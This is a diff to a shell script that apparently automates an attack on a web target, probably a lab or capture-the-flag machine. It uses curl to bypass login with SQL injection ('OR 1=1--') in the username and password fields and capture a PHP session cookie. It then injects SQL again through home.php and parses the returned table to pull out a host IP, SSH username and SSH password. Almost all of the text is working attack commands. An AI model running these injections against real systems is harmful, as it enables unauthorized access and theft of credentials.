@@ -74,15 +74,15 @@ COOKIE=`curl -s -c - --data-binary $'user=%27OR+1%3D1--%27&pass=%27OR+1%3D1--%27
 echo "Session cookie"
 COOKIE='PHPSESSID='$COOKIE
 echo $COOKIE
+
+
+echo ""
+echo "############ SQL Injection ############"
 curl -s -b $COOKIE http://$WEB_IP/home.php?username=%27%20OR%201=1--%27
 CURLOUTPUT=`curl -b $COOKIE http://$WEB_IP/home.php?username=%27%20OR%201=1--%27 | gawk -F "</*td>|</*tr>" ' {print $3, $5, $7 }' | tr -d "\t\n\r" | tr -s ' ' | sed 's/^ *$//g'`
 BOSSIP=`echo $CURLOUTPUT | awk '{print $1}'`
 SSHUSER=`echo $CURLOUTPUT | awk '{print $2}'`
 SSHPASS=`echo $CURLOUTPUT | awk '{print $3}'`
-
-echo ""
-echo "############ SQL Injection ############"
-curl -b $COOKIE http://$WEB_IP/home.php?username=%27%20OR%201=1--%27
 echo ""
 
 echo "===================================================="
